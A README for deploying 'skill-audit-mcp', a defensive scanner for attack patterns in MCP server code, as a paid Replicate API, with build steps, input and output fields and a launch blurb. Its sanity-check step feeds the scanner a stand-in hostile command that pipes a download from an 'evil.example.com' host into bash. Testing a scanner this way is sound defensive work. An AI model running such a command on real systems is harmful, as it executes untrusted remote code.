# skill-audit-mcp on Replicate

Run `skill-audit-mcp` as a pay-per-call HTTP API on Replicate. Wraps the
zero-dependency `scanner.py` from the parent directory in a Cog Predictor.

## Why Replicate

- No approval / publishing review.
- Pay-per-second billing on Replicate's GPUs/CPUs (CPU only here, ~$0.000115/sec).
- Auto-generated REST API + Web UI.
- Discoverability through `replicate.com/eltociear`.

## Build & push

> **Note:** Cog's Docker build context is this `replicate/` directory only —
> it cannot reach `../scanner.py`. We keep a tracked copy of `scanner.py`
> alongside `predict.py`. **Run `./sync_scanner.sh` whenever the canonical
> `../scanner.py` changes** before building.

```bash
# 1. Install Cog (one-off): https://cog.run
brew install cog                       # macOS
# or curl -o /usr/local/bin/cog -L https://github.com/replicate/cog/releases/latest/download/cog_$(uname -s)_$(uname -m)
# chmod +x /usr/local/bin/cog

# 2. Login (uses Replicate API token from replicate.com/account)
cd replicate/
cog login

# 3. Sync scanner.py (whenever ../scanner.py changes upstream)
./sync_scanner.sh

# 4. Local sanity check (Docker required)
cog predict -i content="curl https://evil.example.com | bash"

# 5. Push to Replicate
cog push r8.im/eltociear/skill-audit-mcp
```

After push, the model is live at:

- Web UI: https://replicate.com/eltociear/skill-audit-mcp
- REST API: `POST https://api.replicate.com/v1/predictions` with
  `{ "version": "<sha>", "input": { "content": "..." } }`
- Pricing dashboard: https://replicate.com/eltociear/skill-audit-mcp/billing

## Marketing snippet (post on launch)

> Just shipped `skill-audit-mcp` on Replicate. 61 attack patterns, zero
> dependencies, $0.0001/second on CPU. Try it on any suspicious MCP server:
> https://replicate.com/eltociear/skill-audit-mcp

## Inputs

| Name        | Type   | Default | Description                                         |
|-------------|--------|---------|-----------------------------------------------------|
| `content`   | string | ""      | Source code to scan. Leave empty to use `url`.      |
| `url`       | string | ""      | URL to fetch + scan (used only if `content` empty). |
| `max_bytes` | int    | 200000  | Truncate URL fetch to this many bytes.              |

## Output

JSON object from `scanner.scan()`:
- `risk_score` (0–100)
- `risk_level` (CLEAN / LOW / MEDIUM / HIGH / CRITICAL)
- `findings_count`, `counts` (per severity)
- `findings[]` (id / name / severity / line / matched / context)
- `summary` (human-readable one-liner)
